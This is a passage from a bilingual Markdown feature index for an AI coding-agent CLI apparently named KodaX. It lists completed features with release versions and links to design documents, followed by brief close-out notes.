光标漂移根治、每帧字节量降至差异级、为 057 §10/§11 提供 cell buffer 基础）仍然成立，但紧迫性从"阻断 SSH 使用"降级为"TUI 质量提升"。**详见**：[v0.7.30 Track F 设计](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095)。

---

## 已完成 Feature

| ID | Title | Released | Design |
|---|---|---|---|
| `001` | Plan Mode | `v0.3.1` | [v0.3.1](features/v0.3.1.md) |
| `002` | Ask Mode Hardening | `v0.3.1` | [v0.3.1](features/v0.3.1.md) |
| `003` | Interactive Project Mode | `v0.3.1` | [v0.3.1](features/v0.3.1.md) |
| `004` | Interactive UI Refresh | `v0.3.3` | [v0.3.3](features/v0.3.3.md) |
| `005` | Monorepo Refactor | `v0.4.0` | [v0.4.0](features/v0.4.0.md) |
| `006` | Skills System | `v0.5.10` | [v0.5.0](features/v0.5.0.md) |
| `008` | Permission Model Hardening | `v0.4.6` | [v0.5.0](features/v0.5.0.md) |
| `009` | AI Layer Separation | `v0.5.0` | [v0.5.0](features/v0.5.0.md) |
| `010` | Agent Core and Skills Split | `v0.5.5` | [v0.5.0](features/v0.5.0.md) |
| `011` | Smart Context Compaction | `v0.5.14` | [v0.5.0](features/v0.5.0.md) |
| `012` | TUI Autocomplete | `v0.5.13` | [v0.5.0](features/v0.5.0.md) |
| `013` | Command System 2.0 | `v0.6.0` | [v0.6.0](features/v0.6.0.md) |
| `014` | Project Mode Enhancement | `v0.5.20` | [v0.5.20](features/v0.5.20.md) |
| `015` | Project Mode 2.0 | `v0.6.0` | [v0.6.0](features/v0.6.0.md) |
| `016` | CLI-Based OAuth Providers | `v0.5.22` | [v0.5.22](features/v0.5.22.md) |
| `017` | Pending User Inputs Queue | `v0.6.0` | [v0.6.0](features/v0.6.0.md) |
| `018` | Task-Aware Repository Intelligence Substrate | `v0.7.10` | [v0.7.10](features/v0.7.10.md#feature_018-task-aware-repository-intelligence-substrate) |
| `019` | Session Tree, Checkpoints, and Rewindable Task Runs | `v0.7.2` | [v0.7.0](features/v0.7.0.md#feature_019-session-tree-checkpoints-and-rewindable-task-runs) |
| `020` | AGENTS.md Workspace Rules | `v0.5.34` | [v0.6.0](features/v0.6.0.md) |
| `021` | Provider-Aware Reasoning Budget | `v0.5.37` | [v0.6.0](features/v0.6.0.md) |
| `022` | Adaptive Task Engine and Native Multi-Agent Control Plane | `v0.7.4` | [v0.7.0](features/v0.7.0.md#feature_022-adaptive-task-engine-and-native-multi-agent-control-plane) |
| `023` | Dual-Mode Terminal UX | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_023-dual-mode-terminal-ux) |
| `024` | Project Harness | `v0.6.10` | [v0.6.10](features/v0.6.10.md) |
| `025` | Adaptive Task Intelligence and Harness Router | `v0.7.4` | [v0.7.0](features/v0.7.0.md#feature_025-adaptive-task-intelligence-and-harness-router) |
| `027` | Adaptive Multi-Agent Mode Toggle and Team-Mode Sunset | `v0.7.10` | [v0.7.10](features/v0.7.10.md#feature_027-adaptive-multi-agent-mode-toggle-and-team-mode-sunset) |
| `028` | First-Class Retrieval, Context, and Evidence Tooling | `v0.7.10` | [v0.7.10](features/v0.7.10.md#feature_028-first-class-retrieval-context-and-evidence-tooling) |
| `029` | Provider Capability Transparency and Harness Policy | `v0.7.1` | [v0.7.0](features/v0.7.0.md#feature_029-provider-capability-transparency-and-harness-policy) |
| `031` | Multimodal Artifact Inputs | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_031-multimodal-artifact-inputs) |
| `032` | JSON Output Mode | `v0.6.20` (unreleased) | [v0.6.20](features/v0.6.20.md) |
| `033` | REPL Parallel Toggle | `v0.6.15` | [v0.6.15](features/v0.6.15.md) |
| `034` | Extension and Capability Runtime | `v0.7.0` | [v0.7.0](features/v0.7.0.md#feature_034-extension-and-capability-runtime) |
| `035` | MCP Capability Provider | `v0.7.15` | [v0.8.0](features/v0.8.0.md#feature_035-mcp-capability-provider) |
| `036` | DeepSeek Built-in Provider | `v0.6.15` | [v0.6.15](features/v0.6.15.md) |
| `037` | API Token Usage Priority and Estimation Fallback | `v0.6.20` (unreleased) | [v0.6.20](features/v0.6.20.md) |
| `039` | Plan-Mode Dual-Write Allowlist | `v0.6.15` | [v0.6.15](features/v0.6.15.md) |
| `040` | ACP Server Support | `v0.6.15` | [v0.6.15](features/v0.6.15.md) |
| `041` | Tool Output Guardrails and Context Overflow Protection | `v0.6.20` (unreleased) | [v0.6.20](features/v0.6.20.md) |
| `044` | Durable Compression Anchors and Artifact Recall | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_044-durable-compression-anchors-and-artifact-recall) |
| `045` | Provider Stream Resilience and Graceful Recovery | `v0.7.15` (unreleased) | [v0.7.15](features/v0.7.15.md#feature_045-provider-stream-resilience-and-graceful-recovery) |
| `046` | AMA Handoff Integrity and Final-Answer Convergence | `v0.7.18` | [v0.8.0](features/v0.8.0.md#feature_046-ama-handoff-integrity-and-final-answer-convergence) |
| `047` | Invisible Adaptive Parallelism and Evidence-Driven Fan-Out | `v0.7.19` | [v0.7.19](features/v0.7.19.md#feature_047-invisible-adaptive-parallelism--fan-out-optimization) | 架构完成 (v0.7.16); 执行层完成 (v0.7.18 FEATURE_067); v0.7.19 补齐: winner-cancel, 调度策略, 质量度量 |
| `048` | Sectionized Prompt Assembly and Dynamic Capability Truth | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_048-sectionized-prompt-assembly-and-dynamic-capability-truth) |
| `049` | First-Class Search, Fetch, Code Search, and Semantic Retrieval | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_049-first-class-search-fetch-code-search-and-semantic-retrieval) |
| `050` | Prompt Contracts, Snapshots, and Regression Evaluation | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_050-prompt-contracts-snapshots-and-regression-evaluation) |
| `042` | Incremental Repository Intelligence Refresh and Java/C++ Structural Semantics | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_042-incremental-repository-intelligence-refresh-and-javac-structural-semantics) |
| `051` | Host-Aware Fullscreen TUI Substrate and Transcript UX | `v0.7.25` | [v0.7.25](features/v0.7.25.md#feature_051-host-aware-fullscreen-tui-substrate-and-transcript-ux) |
| `052` | Dual-Profile AMA Harness and Child Fan-Out Boundaries | `v0.7.19` | [v0.7.19](features/v0.7.19.md#feature_052-child-fan-out-boundary-hardening) | 架构完成 (v0.7.16); v0.7.19 补齐: SA 严格模式, 递归防护, controller 精化 |
| `053` | Canonical Repo Identity and Managed Worktree Runtime | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_053-canonical-repo-identity-and-managed-worktree-runtime) |
| `055` | REPL Substrate Hardening and Summary-Only AMA UX | `v0.8.0` (unreleased) | [v0.8.0](features/v0.8.0.md#feature_055-repl-substrate-hardening-and-summary-only-ama-ux) |
| `056` | Tool Interaction Maturity and Transcript-Native Explanation Layer | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_056-tool-interaction-maturity-and-transcript-native-explanation-layer) |
| `054` | AMA-Project Convergence: Absorb Project Mode into Adaptive H2 | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_054-ama-project-convergence-absorb-project-mode-into-adaptive-h2) |
| `043` | Harness Calibration, Pivoting, Profiling, and Safe Checkpoints | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_043-harness-calibration-pivoting-profiling-and-safe-checkpoints) |
| `038` | Official Sandbox Extension | `v0.7.30` (unreleased) | [v0.7.30](features/v0.7.30.md#feature_038-official-sandbox-extension) |
| `061` | Scout-First AMA Architecture Simplification | `v0.7.16` | [v0.7.16](features/v0.7.16.md#feature_061-scout-first-ama-architecture-simplification) |
| `062` | Managed Task Budget Simplification | `v0.7.16` | [v0.7.16](features/v0.7.16.md#feature_062-managed-task-budget-simplification) |
| `064` | Multi-Provider Cost Observatory | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_064-multi-provider-cost-observatory) |
| `065` | MCP Protocol Maturity | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_065-mcp-protocol-maturity) |
| `066` | Permission Hardening | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_066-permission-hardening) |
| `067` | Child Agent Execution — AMA-Native Parallel Task Dispatch | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_067-child-agent-execution--ama-native-parallel-task-dispatch) |
| `068` | Worktree Isolation Tool | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_068-worktree-isolation-tool) |
| `069` | Session Rewind & Shell Completion | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_069-session-rewind--shell-completion) |
| `070` | Context Engine V2 — Multi-Layer Compaction & Post-Compact Reconstruction | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_070-context-engine-v2--multi-layer-compaction--post-compact-reconstruction) |
| `071` | AMA Managed Task Resilience — Worker Checkpoint & Mid-Execution Recovery | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_071-ama-managed-task-resilience--worker-checkpoint--mid-execution-recovery) |
| `074` | Subagent Permission Boundary Hardening | `v0.7.20` (unreleased) | [v0.7.20](features/v0.7.20.md#feature_074-subagent-permission-boundary-hardening) |
| `072` | Lineage-Native Compaction Migration | `v0.7.20` (unreleased) | [v0.7.20](features/v0.7.20.md#feature_072-lineage-native-compaction-migration) |
| `077` | Session-Scoped Prompt Input History | `v0.7.21` | [v0.7.21](features/v0.7.21.md#feature_077-session-scoped-prompt-input-history) |
| `079` | Task Engine Phase 1 — Pure Extraction | `v0.7.22` (unreleased) | [v0.7.22](features/v0.7.22.md#feature_079-task-engine-phase-1--pure-extraction) |
| `080` | Layer A Primitives — Agent / Handoff / Runner / Guardrail | `v0.7.23` | [v0.7.23](features/v0.7.23.md#feature_080-layer-a-primitives--agent--handoff--runner--guardrail) |
| `081` | Compaction Layering and Session Base/Lineage Split | `v0.7.23` | [v0.7.23](features/v0.7.23.md#feature_081-compaction-layering-and-session-baselineage-split) |
| `082` | Package Restructure — @kodax/core, @kodax/mcp, @kodax/tracing, @kodax/session-lineage | `v0.7.24` | [v0.7.24](features/v0.7.24.md#feature_082-package-restructure) |
| `083` | Unified Tracer, Span, and TracingProcessor | `v0.7.24` | [v0.7.24](features/v0.7.24.md#feature_083-unified-tracer-span-and-tracingprocessor) |
| `058` | Transcript Native Scrollback Dump | `v0.7.25` | [v0.7.25](features/v0.7.25.md#feature_058-transcript-native-scrollback-dump) |
| `075` | Plan Approval Dialog Scroll | `v0.7.25` | [v0.7.25](features/v0.7.25.md#feature_075-plan-approval-dialog-scroll) |
| `076` | Managed Task Round Boundary — User Conversation Preservation | `v0.7.25` | [v0.7.25](features/v0.7.25.md#feature_076-managed-task-round-boundary--user-conversation-preservation) |
| `084` | Task Engine Phase 2 — Rewrite Scout/Generator/Evaluator on Layer A Primitives (absorbs FEATURE_059) | `v0.7.26` | [v0.7.26](features/v0.7.26.md#feature_084-task-engine-phase-2--rewrite-scoutgeneratorevaluator-on-layer-a-primitives) |
| `085` | Guardrail Tri-Layer — Input / Output / Tool | `v0.7.26` | [v0.7.26](features/v0.7.26.md#feature_085-guardrail-tri-layer--input--output--tool) |
| `086` | KodaX Prefix Cleanup and Legacy Purge (子任务 A 放弃；子任务 B 完成；含 AMA runner-driven repo-intel 注入恢复 / Windows .exe bin quoting 修复 / ensurePremiumDaemonReady / refresh:true 分层超时 / 临时性失败不污染 failure cache / Ink TUI RepoIntel trace surface / Planner/Evaluator/H1-readonly-Generator 开放 repo-intel deep-capsule 工具) | `v0.7.27` | [v0.7.27](features/v0.7.27.md#feature_086-legacy-code-purge-子任务-a-放弃--子任务-b-完成) |
| `091` | Repo-Intelligence Protocol Package Extraction | `v0.7.27` | [v0.7.27](features/v0.7.27.md#feature_091-repo-intelligence-protocol-package-extraction) |
| `099` | Provider Catalog Refresh — DeepSeek V4 + Kimi-code Label Collapse | `v0.7.28` (unreleased) | [v0.7.28](features/v0.7.28.md#feature_099-provider-catalog-refresh--deepseek-v4--kimi-code-label-collapse) |
| `098` | Per-Model Context Window & Output Token Limits | `v0.7.28` (unreleased) | [v0.7.28](features/v0.7.28.md#feature_098-per-model-context-window--output-token-limits) |

> `FEATURE_051` close-out posture: keep the current REPL status/footer/task/message surfaces frozen, limit follow-up work to invisible substrate maturity for transcript, scroll/selection, and input behavior, and treat the design doc as a completed close-out record rather than an open rollout plan.

> `FEATURE_055` completed the follow-up REPL hardening work: docs-first substrate maturity, summary-only AMA mapping, and no new visible worker/task shell.

> `FEATURE_031` now treats inline image refs as true structured multimodal inputs: provider-facing text uses stable image anchors such as `[Image #1]` and clean unavailable-image placeholders instead of leaking raw `@image-path` syntax.

> `v0.7.18` 主题：Engineering Shell Maturity（工程外壳成熟度）。基于 KodaX vs Claude Code 全面对比分析，补齐工程外壳层面的真实差距。8 个 Feature 全部完成，1 个取消 (063 Hook — 被 Extension 系统吸收，executor 能力提取为 `api.exec()`/`api.webhook()`)。status bar 成本显示 descoped (064)。

---

## 相关文档入口

- [Feature 设计索引](features/README.md)
- [ADR](ADR.md)
- [HLD](HLD.md)
- [DD](DD.md)
- [PRD](PRD.md)
